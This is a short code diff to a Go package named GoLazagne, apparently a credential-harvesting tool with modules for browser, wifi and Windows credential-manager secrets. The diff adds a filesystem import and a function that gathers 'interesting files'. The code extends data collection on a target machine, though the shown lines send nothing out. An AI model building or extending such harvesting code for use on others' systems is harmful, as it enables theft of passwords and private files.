@@ -3,6 +3,7 @@ package GoLazagne
 import (
 	"bitbucket.org/j_kerby/golazagne/browsers"
 	"bitbucket.org/j_kerby/golazagne/common"
+	"bitbucket.org/j_kerby/golazagne/filesystem"
 	"bitbucket.org/j_kerby/golazagne/wifi"
 	"bitbucket.org/j_kerby/golazagne/windows"
 )
@@ -34,6 +35,11 @@ func ExtractCredmanData() ([]common.NamePass, int) {
 		return windowsResult.Data, len(windowsResult.Data)
 	}
 	return nil, 0
+}
+
+func ExtractInterstingFiles() []string{
+	var data = filesystem.FindFiles()
+	return data
 }
 
 type AllDataStruct struct {
